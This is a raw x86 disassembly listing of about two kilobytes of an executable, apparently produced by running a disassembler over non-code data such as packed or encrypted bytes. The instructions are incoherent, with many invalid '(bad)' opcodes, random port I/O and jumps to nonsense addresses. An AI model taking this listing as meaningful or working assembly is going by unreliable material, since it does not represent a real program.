  40975f:	mov    bh,0x11
  409761:	sub    eax,0x49803825
  409766:	aaa    
  409767:	dec    esp
  409768:	jbe    0x409709
  40976a:	dec    eax
  40976b:	arpl   WORD PTR ds:0xd64511bb,di
  409771:	inc    ecx
  409772:	or     edi,esi
  409774:	out    0x28,eax
  409776:	in     eax,0x89
  409778:	bnd jo 0x409764
  40977b:	or     ebp,DWORD PTR [eax+0x19403d33]
  409781:	xor    eax,0x25ff5140
  409786:	mov    ecx,0xdd7643eb
  40978b:	adc    BYTE PTR [edx+eax*8+0x51],ch
  40978f:	inc    ebx
  409790:	enter  0x2a57,0x6a
  409794:	mov    ds,WORD PTR [eax-0x78afd4d8]
  40979a:	cld    
  40979b:	arpl   WORD PTR [edi+eax*1+0x10],bx
  40979f:	sub    edi,DWORD PTR [edx-0x4dd94cb9]
  4097a5:	sub    BYTE PTR [ebx],bl
  4097a7:	les    ebx,FWORD PTR ds:0xf05473c9
  4097ad:	imul   esi,DWORD PTR [eax+0x1e],0xb
  4097b1:	in     eax,0x94
  4097b3:	in     al,dx
  4097b4:	xchg   ebx,eax
  4097b5:	les    edi,FWORD PTR [eax+0x9]
  4097b8:	pushf  
  4097b9:	rcl    ah,0x3b
  4097bc:	xchg   esp,eax
  4097bd:	cmp    DWORD PTR [eax-0x34],esi
  4097c0:	stos   BYTE PTR es:[edi],al
  4097c1:	sbb    DWORD PTR [ecx-0x73f97b15],esp
  4097c7:	jp     0x409841
  4097c9:	std    
  4097ca:	fsubr  DWORD PTR [ebp-0x10981ba0]
  4097d0:	sub    ebx,edi
  4097d2:	ss pop ecx
  4097d4:	daa    
  4097d5:	inc    edi
  4097d6:	or     al,0xcc
  4097d8:	jne    0x409835
  4097da:	call   0xc0eac5d8
  4097df:	push   ecx
  4097e0:	test   eax,0xe962c412
  4097e5:	xor    DWORD PTR [ebx+0x248e4991],eax
  4097eb:	sbb    eax,0x25f5ac97
  4097f0:	div    DWORD PTR [ebp+0x27ae7ee]
  4097f6:	mov    ebp,0x2f07164d
  4097fb:	(bad)  
  4097fc:	(bad)  
  4097fd:	imul   eax,DWORD PTR [esp+esi*8-0x6],0x5cc6945f
  409805:	or     BYTE PTR [esi-0x48862673],bh
  40980b:	pop    esp
  40980c:	mov    ecx,0x915aab10
  409811:	push   ebx
  409812:	popf   
  409813:	xor    eax,0xadc757f9
  409818:	gs out dx,eax
  40981a:	icebp  
  40981b:	jge    0x40983b
  40981d:	jmp    0xf883f1e5
  409822:	test   BYTE PTR [ebp+0x3dbb0401],bl
  409828:	jnp    0x409845
  40982a:	mov    WORD PTR ds:0xeaf6cea1,fs
  409830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409831:	lods   eax,DWORD PTR ds:[esi]
  409832:	or     al,0xeb
  409834:	ss add al,0x47
  409837:	add    eax,0xd0947462
  40983c:	xchg   eax,ecx
  40983e:	sub    BYTE PTR [ebp-0xc],0x89
  409842:	arpl   WORD PTR [ecx],ax
  409844:	sbb    eax,0x4f01373f
  409849:	das    
  40984a:	(bad)  
  40984b:	retf   
  40984c:	sbb    BYTE PTR [ebp-0x1c275f04],0x2e
  409853:	out    dx,eax
  409854:	fcmovb st,st(7)
  409856:	mov    cl,0x97
  409858:	adc    BYTE PTR [edi+0x2cd029ba],bh
  40985e:	fild   WORD PTR ds:0xbe2080e5
  409864:	mov    edx,0x594b5457
  409869:	push   eax
  40986a:	mov    dh,0xcc
  40986c:	inc    esi
  40986d:	inc    edx
  40986e:	leave  
  40986f:	enter  0xbae2,0x56
  409873:	cmp    al,0xdf
  409875:	jmp    0xf2ed3d0a
  40987a:	popa   
  40987b:	lahf   
  40987c:	jl     0x4098d7
  40987e:	ret    0x8f96
  409881:	push   ebp
  409882:	ja     0x4098f2
  409884:	rcl    BYTE PTR [esp+ebx*2+0x65],0xff
  409889:	inc    edi
  40988a:	pop    ebx
  40988b:	dec    esi
  40988c:	imul   edi,DWORD PTR fs:[esi+eax*1+0x2d],0xffffffa7
  409892:	fs push edi
  409894:	lods   al,BYTE PTR ds:[esi]
  409895:	daa    
  409896:	add    al,0xbf
  409898:	imul   eax,DWORD PTR [esi-0x61],0x14
  40989c:	les    edx,FWORD PTR [ebx]
  40989e:	out    0xa5,al
  4098a0:	in     al,dx
  4098a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098a2:	xchg   esi,eax
  4098a3:	data16 jns 0x409864
  4098a6:	cld    
  4098a7:	jo     0x40984b
  4098a9:	in     al,dx
  4098aa:	pop    ebp
  4098ab:	jnp    0x4098a9
  4098ad:	push   edi
  4098ae:	sbb    eax,0x9d0dbf09
  4098b3:	mov    ah,BYTE PTR [edi+0x6ad90498]
  4098b9:	xchg   edi,eax
  4098ba:	je     0x409905
  4098bc:	and    bl,BYTE PTR [edx+0x124eebaa]
  4098c2:	test   al,0xff
  4098c4:	add    ebp,DWORD PTR [esi-0x44d899c5]
  4098ca:	and    ebx,esi
  4098cc:	mov    es,eax
  4098ce:	in     al,0x1a
  4098d0:	dec    esp
  4098d1:	pop    es
  4098d2:	push   esp
  4098d3:	icebp  
  4098d4:	aad    0xcb
  4098d6:	fwait
  4098d7:	in     al,0x87
  4098d9:	cmp    bl,BYTE PTR [edi]
  4098db:	(bad)  
  4098dc:	fimul  DWORD PTR [ebp+0x483730d7]
  4098e2:	pop    ebx
  4098e3:	in     eax,0x38
  4098e5:	outs   dx,BYTE PTR ds:[esi]
  4098e6:	mov    eax,0xdb725894
  4098eb:	aad    0xa2
  4098ed:	mov    ch,0x2
  4098ef:	mov    ebp,0xede8dcc4
  4098f4:	popf   
  4098f5:	(bad)  
  4098f6:	jns    0x409904
  4098f8:	callw  0x5800
  4098fc:	std    
  4098fd:	or     DWORD PTR [edi-0x6c575480],edx
  409903:	lods   eax,DWORD PTR ds:[esi]
  409904:	pop    edi
  409905:	pop    eax
  409906:	adc    BYTE PTR [eax+0x26],0xb0
  40990a:	sub    BYTE PTR [ecx+0x3fe43920],dh
  409910:	frstor [ebx-0x41ee5ace]
  409916:	retf   
  409917:	sar    DWORD PTR [esi+0x50],1
  40991a:	mov    ch,0x69
  40991c:	sub    eax,0xb169797f
  409921:	add    eax,0xf7565cec
  409926:	cmc    
  409927:	dec    edx
  409928:	push   ds
  409929:	inc    esi
  40992a:	mov    edi,0xd092b0e7
  40992f:	xor    DWORD PTR [ecx+0x6ba9e186],edi
  409935:	dec    DWORD PTR [esi]
  409937:	xlat   BYTE PTR ds:[ebx]
  409938:	push   ss
  409939:	jl     0x4099a0
  40993b:	inc    edi
  40993c:	leave  
  40993d:	mov    DWORD PTR [esi+0x28],ebx
  409940:	popa   
  409941:	sbb    ecx,DWORD PTR [edi]
  409943:	push   0xffffffcc
  409945:	test   DWORD PTR [eax],0x28d90997
  40994b:	sbb    BYTE PTR [esi-0x2e92c3c9],bh
  409951:	nop
  409952:	sbb    eax,0xbc74e9ca
  409957:	shr    ecx,1
  409959:	fldenv [eax]
  40995b:	push   es
  40995c:	jecxz  0x4099b9
  40995e:	mov    ch,0x51
  409960:	mov    eax,ds:0x12a93d5d
  409965:	sbb    BYTE PTR [ecx-0x2],ah
  409968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409969:	adc    al,0x32
  40996b:	push   edx
  40996c:	push   ecx
  40996d:	mov    eax,ds:0x216b2973
  409972:	dec    ecx
  409973:	xlat   BYTE PTR ds:[ebx]
  409974:	mov    WORD PTR ds:0xc7a0a15c,fs
  40997a:	sub    DWORD PTR [ecx-0xa],esp
  40997d:	push   0xffffff90
  40997f:	in     al,0x11
  409981:	jge    0x40991e
  409983:	loopne 0x4099e5
  409985:	mov    cs:0x42768ce8,al
  40998b:	jnp    0x40995a
  40998d:	jg     0x409988
  40998f:	lahf   
  409990:	push   0xffffffc5
  409992:	mov    al,0xce
  409994:	inc    edx
  409995:	out    dx,al
  409996:	enter  0xfff9,0xa4
  40999a:	int    0x71
  40999c:	add    DWORD PTR [esi],esp
  40999e:	and    al,0x11
  4099a0:	lods   eax,DWORD PTR gs:[esi]
  4099a2:	pushf  
  4099a3:	or     DWORD PTR [edi],edx
  4099a5:	cmp    DWORD PTR [esi+esi*2-0x9],ebx
  4099a9:	xchg   esp,eax
  4099aa:	(bad)  
  4099ab:	stc    
  4099ac:	dec    esp
  4099ad:	stc    
  4099ae:	cld    
  4099af:	retf   
  4099b0:	ds nop
  4099b2:	push   edi
  4099b3:	cmp    ebp,DWORD PTR [ebx-0x57]
  4099b6:	mov    bh,BYTE PTR [ebx+0x3b76dbd1]
  4099bc:	push   edi
  4099bd:	(bad)  
  4099be:	shl    edx,cl
  4099c0:	jo     0x4099a0
  4099c2:	xchg   esi,eax
  4099c3:	jg     0x4099af
  4099c5:	xlat   BYTE PTR ds:[ebx]
  4099c6:	or     esi,DWORD PTR [ebx-0x47fee853]
  4099cc:	loop   0x4099c2
  4099ce:	pop    esi
  4099cf:	jae    0x4099b7
  4099d1:	pop    esp
  4099d2:	mov    dh,0x7
  4099d4:	pop    edx
  4099d5:	loop   0x4099f0
  4099d7:	sub    DWORD PTR [ebp+0x24b59e59],ebx
  4099dd:	and    DWORD PTR [ebp+0x2d2b851b],0x27
  4099e4:	adc    esi,DWORD PTR [edi-0x3c]
  4099e7:	add    dh,BYTE PTR [edx]
  4099e9:	pop    ds
  4099ea:	(bad)  
  4099eb:	mov    bl,0x3
  4099ed:	scas   eax,DWORD PTR es:[edi]
  4099ee:	fcomp  DWORD PTR [edx+ebp*1]
  4099f1:	push   ecx
  4099f2:	pop    edx
  4099f3:	cmp    dl,ah
  4099f5:	push   0x5f
  4099f7:	shl    BYTE PTR [esi+0x71cc4a45],1
  4099fd:	je     0x4099bf
  4099ff:	sahf   
  409a00:	ficom  DWORD PTR [esi]
  409a02:	jecxz  0x409a5e
  409a04:	sahf   
  409a05:	int3   
  409a06:	push   ss
  409a07:	cmp    al,0xaa
  409a09:	push   ecx
  409a0a:	in     al,0xcd
  409a0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a0d:	dec    esi
  409a0e:	gs xchg ecx,esi
  409a11:	stc    
  409a12:	push   ebx
  409a13:	cdq    
  409a14:	out    0x1b,al
  409a16:	lock push esi
  409a18:	imul   DWORD PTR [esi]
  409a1a:	mov    ebp,0x1b2962d2
  409a1f:	cmp    eax,0x25c3fead
  409a24:	outs   dx,BYTE PTR ds:[esi]
  409a25:	out    dx,al
  409a26:	or     cl,BYTE PTR [edi+0x37]
  409a29:	ss or  al,0xe7
  409a2c:	scas   al,BYTE PTR es:[edi]
  409a2d:	add    BYTE PTR [edx],al
  409a2f:	(bad)  
  409a30:	in     al,0xcc
  409a32:	cmp    dh,0xf
  409a35:	push   si
  409a37:	or     eax,ebx
  409a39:	cmp    al,0xf
  409a3b:	inc    ecx
  409a3c:	out    0x87,al
  409a3e:	shr    DWORD PTR [edx],0x39
  409a41:	adc    BYTE PTR ds:0x647630a1,0xaf
  409a48:	sbb    esi,esi
  409a4a:	pop    ebx
  409a4b:	loope  0x409ab0
  409a4d:	fistp  DWORD PTR [esi]
  409a4f:	sbb    al,0x1a
  409a51:	shl    DWORD PTR [ebx+0x5e],0x5d
  409a55:	inc    edi
  409a56:	add    DWORD PTR [esi-0x5],0x16c4bc47
  409a5d:	pop    ebx
  409a5e:	add    esi,DWORD PTR [ebx]
  409a60:	adc    ebx,DWORD PTR [ebp+0x414db1d3]
  409a66:	(bad)  
  409a67:	mov    bh,0x35
  409a69:	xor    DWORD PTR [ebx],edi
  409a6b:	loopne 0x409a23
  409a6d:	scas   al,BYTE PTR es:[edi]
  409a6e:	push   ds
  409a6f:	push   0x961f0526
  409a74:	and    dl,dl
  409a76:	ja     0x409a80
  409a78:	sti    
  409a79:	adc    al,0x91
  409a7b:	cdq    
  409a7c:	je     0x409a58
  409a7e:	and    BYTE PTR [eax+0x17],al
  409a81:	xchg   BYTE PTR [ebx],bl
  409a83:	xchg   esi,eax
  409a84:	mov    al,ds:0x5c8cdc7f
  409a89:	pop    esi
  409a8a:	mov    dh,0xbb
  409a8c:	sbb    DWORD PTR [edx+0x774aab2d],edi
  409a92:	popf   
  409a93:	aad    0x52
  409a95:	js     0x409a4c
  409a97:	pop    esi
  409a98:	out    0xfd,al
  409a9a:	jl     0x409a6d
  409a9c:	push   edx
  409a9d:	int3   
  409a9e:	mov    edi,0x2e67e89
  409aa3:	call   0xa1cf05df
  409aa8:	(bad)  
  409aa9:	fistp  DWORD PTR [ebp+0x40]
  409aac:	inc    ebp
  409aad:	lahf   
  409aae:	push   ebp
  409aaf:	inc    ebx
  409ab0:	inc    edi
  409ab1:	je     0x409aa9
  409ab3:	cld    
  409ab4:	ret    0x749a
  409ab7:	xchg   ebp,eax
  409ab8:	pop    esi
  409ab9:	push   es
  409aba:	std    
  409abb:	mov    BYTE PTR [ebp-0x4ba49619],ah
  409ac1:	adc    bl,BYTE PTR [eax+0xa2f8d4c]
  409ac7:	sbb    edx,eax
  409ac9:	mov    ebp,0xc94a174b
  409ace:	rcl    DWORD PTR [ebp-0x7],0x4e
  409ad2:	xchg   DWORD PTR [edi+eiz*1-0x358c5e25],esi
  409ad9:	sbb    BYTE PTR [edx-0x2ec7a44c],ah
  409adf:	sub    cl,dl
  409ae1:	cmp    eax,0xf0e4d35e
  409ae6:	mov    BYTE PTR [esi-0x368d516b],0xd1
  409aed:	jecxz  0x409abf
  409aef:	je     0x409b41
  409af1:	pop    ss
  409af2:	sbb    BYTE PTR [ecx+ebx*1+0x2246650e],bl
  409af9:	jmp    0x3cc7:0xff22ab1a
  409b00:	xchg   edx,eax
  409b01:	xchg   BYTE PTR [ebp+0x76],dl
  409b04:	add    BYTE PTR [esi+ecx*2+0x60],0x39
  409b09:	or     ebp,DWORD PTR [eax-0x3c]
  409b0c:	aam    0x95
  409b0e:	cld    
  409b0f:	shr    edi,1
  409b11:	push   edi
  409b12:	jb     0x409b71
  409b14:	pop    esp
  409b15:	add    ebx,DWORD PTR [ebx+0x40]
  409b18:	and    al,BYTE PTR [ebp+0x11b9f4c0]
  409b1e:	cmp    ebx,ecx
  409b20:	clc    
  409b21:	gs pop ebp
  409b23:	jl     0x409b53
  409b25:	int3   
  409b26:	sub    eax,0x8e459a89
  409b2b:	loope  0x409acc
  409b2d:	push   esp
  409b2e:	out    0x30,eax
  409b30:	cmp    esp,ebp
  409b32:	aaa    
  409b33:	push   edx
  409b34:	jge    0x409ac7
  409b36:	mov    bl,0x41
  409b38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b39:	cwde   
  409b3a:	jl     0x409b1b
  409b3c:	daa    
  409b3d:	sub    DWORD PTR [ebx-0x31],edi
  409b40:	pop    esp
  409b41:	xchg   ebp,eax
  409b42:	or     DWORD PTR [ebx],ecx
  409b44:	in     eax,dx
  409b45:	in     eax,0x64
  409b47:	jle    0x409b0e
  409b49:	mov    BYTE PTR [ebp-0x74c7bcd],ah
  409b4f:	adc    eax,0xcc281ccd
  409b54:	xor    DWORD PTR [ebx],ecx
  409b56:	(bad)  
  409b57:	neg    DWORD PTR [ebx]
  409b59:	xchg   esp,eax
  409b5a:	fistp  DWORD PTR [esp+ebx*1-0x13]
  409b5e:	add    eax,0xef86d34e
  409b63:	call   0xc8e:0xe4832ab8
  409b6a:	sub    ebx,DWORD PTR [esi+0x675adff3]
  409b70:	aam    0x5
  409b72:	xchg   edx,eax
  409b73:	mov    DWORD PTR [edi],eax
  409b75:	mov    esi,0x44f78c09
  409b7a:	add    DWORD PTR [edx+0x3],0xffffffdf
  409b7e:	cmp    BYTE PTR [esp+eiz*4],0xc4
  409b82:	xchg   esi,eax
  409b83:	pop    ebp
  409b84:	in     al,0x56
  409b86:	retf   0x34e6
  409b89:	aam    0x62
  409b8b:	test   BYTE PTR [eax],al
  409b8d:	pop    es
  409b8e:	cdq    
  409b8f:	xor    eax,0x5b21a3cd
  409b94:	mov    ebp,0x23731287
  409b99:	pop    es
  409b9a:	icebp  
  409b9b:	(bad)  
  409b9c:	mov    al,0x47
  409b9e:	shr    BYTE PTR [eax-0x45840b5d],cl
  409ba4:	pop    esp
  409ba5:	pushf  
  409ba6:	jg     0x409b68
  409ba8:	sub    edi,esp
  409baa:	mov    esi,0xb884a366
  409baf:	mov    bl,0x7f
  409bb1:	jb     0x409bf0
  409bb3:	call   0x6adfd14a
  409bb8:	xchg   ebp,eax
  409bb9:	data16 jo 0x409bc3
  409bbc:	sbb    dl,BYTE PTR [eax]
  409bbe:	adc    dl,ah
  409bc0:	push   edx
  409bc1:	cs add eax,0xe175e9eb
  409bc7:	js     0x409be6
  409bc9:	adc    eax,0x986656a2
  409bce:	pop    edx
  409bcf:	jp     0x409b7f
  409bd1:	or     edi,DWORD PTR [edi-0x18]
  409bd4:	jl     0x409bde
  409bd6:	aaa    
  409bd7:	inc    esp
  409bd8:	adc    al,0x63
  409bda:	mov    edx,0x1ea7dfa1
  409bdf:	and    DWORD PTR [ecx-0x53],0x2a9c8d34
  409be6:	mov    BYTE PTR [ebp-0x4c],ah
  409be9:	pop    ebp
  409bea:	data16 std 
  409bec:	jg     0x409c31
  409bee:	into   
  409bef:	popa   
  409bf0:	mov    WORD PTR [eax+0x49],?
  409bf3:	xchg   ecx,eax
  409bf4:	push   DWORD PTR [edx+0xd791a49]
  409bfa:	ds js  0x409b86
  409bfd:	mov    edi,0x82129f77
  409c02:	test   esi,ebx
  409c04:	aas    
  409c05:	in     al,0x70
  409c07:	pop    ecx
  409c08:	jmp    0x409c17
  409c0a:	mov    ds:0xcf4d3f2f,al
  409c0f:	mov    eax,0xd1cfaa38
  409c14:	adc    ecx,DWORD PTR [ecx]
  409c16:	sub    eax,esp
  409c18:	loop   0x409c20
  409c1a:	dec    edx
  409c1b:	add    eax,0x981b2b6d
  409c20:	fs fwait
  409c22:	fbld   TBYTE PTR es:[ebp-0x49f118cd]
  409c29:	in     al,0x9
  409c2b:	jae    0x409c49
  409c2d:	fisub  WORD PTR [eax]
  409c2f:	ja     0x409c5e
  409c31:	iret   
  409c32:	pop    ds
  409c33:	fmul   QWORD PTR [eax-0x41e01637]
  409c39:	inc    ebp
  409c3a:	fdivrp st(2),st
  409c3c:	and    BYTE PTR [edi],al
  409c3e:	push   ds
  409c3f:	(bad)  
  409c41:	mul    DWORD PTR [esp+ebx*2]
  409c44:	cmp    eax,DWORD PTR [ebx-0x2d]
  409c47:	enter  0x3926,0xf1
  409c4b:	outs   dx,DWORD PTR ds:[esi]
  409c4c:	sub    DWORD PTR [esi+esi*8-0x55f05cd6],esp
  409c53:	idiv   BYTE PTR [ecx+0x7ab6a65b]
  409c59:	jmp    0xdd471331
  409c5e:	add    esi,DWORD PTR [edx+0x385b5daa]
  409c64:	pop    eax
  409c65:	inc    edi
  409c66:	mov    ch,BYTE PTR [ebp+0xdb4bbb]
  409c6c:	sti    
  409c6d:	mov    al,ds:0xfa0d5656
  409c72:	enter  0x8980,0x21
  409c76:	hlt    
  409c77:	or     eax,0x9edeaa75
  409c7c:	cdq    
  409c7d:	inc    ecx
  409c7e:	inc    eax
  409c7f:	neg    ebp
  409c81:	jne    0x409c2f
  409c83:	fsubr  QWORD PTR [eax+ebx*8]
  409c86:	rol    DWORD PTR [eax],1
  409c88:	push   es
  409c89:	inc    ebx
  409c8a:	and    ah,ah
  409c8c:	je     0x409cca
  409c8e:	aaa    
  409c8f:	mov    eax,ds:0x7459561b
  409c94:	iret   
  409c95:	div    edx
  409c97:	xor    esi,esp
  409c99:	push   0xe67e1715
  409c9e:	xor    BYTE PTR [esi+0x57002afc],ch
  409ca4:	jnp    0x409c6e
  409ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ca7:	sub    eax,0x90fd76fa
  409cac:	sbb    ebp,ebx
  409cae:	push   edi
  409caf:	mov    ds:0x6cced8bd,al
  409cb4:	into   
  409cb5:	(bad)
  409cb9:	test   al,0x41
  409cbb:	scas   eax,DWORD PTR es:[edi]
  409cbc:	pop    es
  409cbd:	jmp    0xcb47:0x6819f163
  409cc4:	sub    DWORD PTR [ebx+0x4c0c116f],eax
  409cca:	jns    0x409c5f
  409ccc:	sub    al,0xa4
  409cce:	and    ah,dh
  409cd0:	cwde   
  409cd1:	out    0x30,al
  409cd3:	add    DWORD PTR [ebx-0x671f151e],edx
  409cd9:	sub    BYTE PTR gs:[eax-0x4b35e8f3],bh
  409ce0:	pop    ds
  409ce1:	cs enter 0xab93,0xc6
  409ce6:	stc    
  409ce7:	dec    ebp
  409ce8:	retf   
  409ce9:	adc    ecx,DWORD PTR [esi]
  409ceb:	fcmovnbe st,st(3)
  409ced:	nop
  409cee:	jg     0x409cef
  409cf0:	mov    ecx,0xde40e359
  409cf5:	sub    BYTE PTR [esi],dl
  409cf7:	sub    DWORD PTR [edx+0x2e024018],ebx
  409cfd:	push   edi
  409cfe:	inc    ebp
  409cff:	in     eax,dx
  409d00:	ins    DWORD PTR es:[edi],dx
  409d01:	xlat   BYTE PTR ds:[ebx]
  409d02:	adc    al,0x36
  409d04:	inc    esp
  409d05:	imul   ecx,ebx,0xcb8829f1
  409d0b:	pop    ebx
  409d0c:	lea    edx,[edx+0x4f]
  409d0f:	xchg   ecx,eax
  409d10:	and    al,0x38
  409d13:	stc    
  409d14:	push   eax
  409d15:	or     DWORD PTR [ecx+ebp*8-0x3f9f1b66],esp
  409d1c:	pop    esp
  409d1d:	or     BYTE PTR [ecx+ebx*2-0xe],cl
  409d21:	push   0x31
  409d23:	mov    cl,0xdf
  409d25:	mov    WORD PTR [edx],es
  409d27:	sub    ecx,eax
  409d29:	(bad)  
  409d2a:	lahf   
  409d2b:	arpl   cx,si
  409d2d:	pop    es
  409d2e:	popf   
  409d2f:	ds jp  0x409d56
  409d32:	fdivr  DWORD PTR [ebx-0x5ba937c7]
  409d38:	mov    edi,0xeec4a67b
  409d3d:	xchg   esp,eax
  409d3e:	into   
  409d3f:	jmp    DWORD PTR [edi+0x5b]
  409d42:	daa    
  409d43:	inc    ebx
  409d44:	mov    bh,0xb6
  409d46:	cmovle edx,DWORD PTR [esi+0x153e6a24]
  409d4d:	(bad)  
  409d4f:	push   0xffffffe3
  409d51:	or     ecx,edx
  409d53:	and    eax,0x84ff9e62
  409d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d59:	jle    0x409cf2
  409d5b:	iret   
  409d5c:	dec    eax
  409d5d:	aas    
  409d5e:	sbb    ah,BYTE PTR ds:0x464c1052
  409d64:	cmp    BYTE PTR ss:[eax-0x78fc8dfa],bl
  409d6b:	pushf  
  409d6c:	ja     0x409dea
  409d6e:	inc    ebx
  409d6f:	cli    
  409d70:	jp     0x409d1c
  409d72:	fcom   DWORD PTR [ebp-0x61]
  409d75:	push   ebp
  409d76:	mov    ecx,ds
  409d78:	repnz into 
  409d7a:	inc    edi
  409d7b:	mov    ch,dh
  409d7d:	fstp   QWORD PTR [ebx]
  409d7f:	mov    ecx,0xd3b358c8
  409d84:	out    0x2e,eax
  409d86:	jle    0x409dea
  409d88:	sti    
  409d89:	js     0x409d58
  409d8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d8c:	jnp    0x409dfd
  409d8e:	loop   0x409d80
  409d90:	es pop ebp
  409d92:	loope  0x409d67
  409d94:	call   0x78b67ca9
  409d99:	ftst   
  409d9b:	es jge 0x409de7
  409d9e:	mov    eax,0x4bcd277f
  409da3:	push   eax
  409da4:	cmp    esp,ebx
  409da6:	ret    
  409da7:	jl     0x409d84
  409da9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409daa:	jnp    0x409d58
  409dac:	fadd   DWORD PTR [eax+ebp*1]
  409daf:	mov    esi,esp
  409db1:	lock sub edi,edi
  409db4:	call   0x57b7668
  409db9:	loopne 0x409e16
  409dbb:	push   eax
  409dbc:	fs icebp 
  409dbe:	jmp    0x409e3a
  409dc0:	sbb    DWORD PTR [esi-0x24],edx
  409dc3:	(bad)  
  409dc4:	jb     0x409d65
  409dc6:	das    
  409dc7:	sbb    DWORD PTR [ebx+0x2d93671a],0xc1270178
  409dd1:	into   
  409dd2:	or     eax,0x2eaab22c
  409dd7:	jmp    0x409daf
  409dd9:	jg     0x409db5
  409ddb:	cmp    eax,0x46168733
  409de0:	sbb    eax,0x583160a5
  409de5:	jnp    0x409e39
  409de7:	rcr    edx,0x56
  409dea:	out    0x93,eax
  409dec:	xor    eax,0x4c15d321
  409df1:	arpl   ax,sp
  409df3:	dec    edi
  409df4:	cmp    al,0x16
  409df6:	stos   DWORD PTR es:[edi],eax
  409df7:	mov    eax,ds:0x40a2a133
  409dfc:	stos   DWORD PTR es:[edi],eax
  409dfd:	inc    eax
  409dfe:	ins    BYTE PTR es:[edi],dx
  409dff:	arpl   WORD PTR [edx+0x5da1c848],cx
  409e05:	push   edx
  409e06:	lds    esi,FWORD PTR [edi]
  409e08:	sbb    al,0x2f
  409e0b:	mov    esp,0x6ab9bac2
  409e10:	daa    
  409e11:	sbb    eax,0x8862e7d4
  409e16:	lahf   
  409e17:	sub    dh,BYTE PTR [ecx-0x71]
  409e1a:	xchg   ecx,eax
  409e1b:	push   ebp
  409e1c:	mov    ebp,0xa307781d
  409e21:	(bad)  
  409e22:	dec    ebp
  409e23:	test   cl,0xc2
  409e26:	ins    BYTE PTR es:[edi],dx
  409e27:	addr16 int 0xb2
  409e2a:	add    al,0x52
  409e2c:	dec    edi
  409e2d:	pop    esi
  409e2e:	jmp    0x409e4e
  409e30:	xor    eax,0x90a17819
  409e35:	adc    ch,BYTE PTR [esi-0xb824afa]
  409e3b:	in     al,dx
  409e3c:	ret    
  409e3d:	xchg   ecx,eax
  409e3e:	mov    al,0x86
  409e40:	sub    DWORD PTR [ecx+0x2c],0x8f5ff38
  409e47:	xchg   DWORD PTR [ebx+0x2c34c062],ebp
  409e4d:	lahf   
  409e4e:	pop    esi
  409e4f:	les    ecx,FWORD PTR [ecx+0xe9f56ef]
  409e55:	and    al,BYTE PTR [ecx+edx*2]
  409e58:	mov    ch,0x3f
  409e5a:	loop   0x409e77
  409e5c:	fwait
  409e5d:	inc    edx
  409e5e:	in     al,dx
  409e5f:	mov    bl,0xc7
  409e61:	fwait
  409e62:	mov    cl,0xaf
  409e64:	sub    bh,al
  409e66:	shr    BYTE PTR [eax+0x369cec2a],0x61
  409e6d:	inc    ebp
  409e6e:	xchg   edx,eax
  409e6f:	popf   
  409e70:	std    
  409e71:	sti    
  409e72:	addr16 add esi,edx
  409e75:	add    esi,ebx
  409e77:	popf   
  409e78:	rcr    BYTE PTR ds:0xc67140e4,cl
  409e7e:	stos   DWORD PTR es:[edi],eax
  409e7f:	popa   
  409e80:	push   ebp
  409e81:	xchg   edi,eax
  409e82:	mov    al,0xe6
  409e84:	icebp  
  409e85:	cmp    edi,0xec1ba5ef
  409e8b:	xor    di,WORD PTR [ecx-0x6d4d883e]
  409e92:	outs   dx,BYTE PTR ds:[esi]
  409e93:	lods   al,BYTE PTR ds:[esi]
  409e94:	mov    esi,0xcbc0a39
  409e99:	mov    dh,0xf2
  409e9b:	lods   al,BYTE PTR ds:[esi]
  409e9c:	repnz sbb esi,DWORD PTR [edx]
  409e9f:	dec    edi
  409ea0:	shr    ah,0xe4
  409ea3:	fld    DWORD PTR [eax]
  409ea5:	clc    
  409ea6:	pop    esi
  409ea7:	cdq    
  409ea8:	add    BYTE PTR [eax-0x1357cfe4],dh
  409eae:	jge    0x409e30
  409eb0:	jnp    0x409eda
  409eb2:	test   ch,0x9e
  409eb5:	nop
  409eb6:	mov    ds:0x71db45c9,eax
  409ebb:	mov    cl,0x37
  409ebd:	mov    al,0x96
  409ebf:	daa    
  409ec0:	ja     0x409ec2
  409ec2:	arpl   WORD PTR [eax-0x1c],bp
  409ec5:	les    ecx,FWORD PTR [eax+0x53a3c46b]
  409ecb:	into   
  409ecc:	xor    edi,DWORD PTR [ebp-0x71]
  409ecf:	arpl   WORD PTR [eiz*4-0x5512d8cd],bp
  409ed6:	inc    BYTE PTR [edi]
  409ed8:	sub    ch,BYTE PTR [esi-0x383ad82c]
  409ede:	sar    edx,0xbd
  409ee1:	jge    0x409f27
  409ee3:	add    BYTE PTR [ebx+0x56],cl
  409ee6:	or     al,0x4e
  409ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ee9:	mov    cl,0xc6
  409eeb:	sub    DWORD PTR [edi],ecx
  409eed:	mov    ecx,0x2d166e3f
  409ef2:	int    0xa5
  409ef4:	scas   al,BYTE PTR es:[edi]
  409ef5:	icebp  
  409ef6:	addr16 icebp 
  409ef8:	push   0x77
  409efa:	jmp    0x66b2:0xb512327a
  409f01:	xchg   ecx,eax
  409f02:	call   0x69f6:0xf6f248e0
  409f09:	(bad)  
  409f0b:	inc    edi
  409f0c:	xor    eax,DWORD PTR [edx+esi*8-0x61]
  409f10:	pop    ss
  409f11:	scas   al,BYTE PTR es:[edi]
  409f12:	pusha  
  409f13:	int    0x9d
  409f15:	call   0x9e1428fa
  409f1a:	jmp    0x15c3fc34
  409f1f:	push   es
  409f20:	mov    edi,0x5103dc40
  409f25:	push   es
  409f26:	aas    
  409f27:	imul   ecx,ecx,0xffffffde
  409f2a:	in     eax,0xf7
  409f2c:	sbb    ebx,DWORD PTR [edi+0x79]
  409f2f:	mov    ebp,DWORD PTR ds:0x7b7f81b9
  409f35:	inc    eax
  409f36:	in     eax,dx
  409f37:	pop    esp
  409f38:	and    BYTE PTR [esi+0x77f7c8d0],0x28
  409f3f:	into   
  409f40:	push   eax
  409f41:	shl    dl,cl
  409f43:	mov    DWORD PTR [ecx-0x46],ebx
  409f46:	hlt    
  409f47:	sahf   
  409f48:	addr16 mov ds:0x9637,al
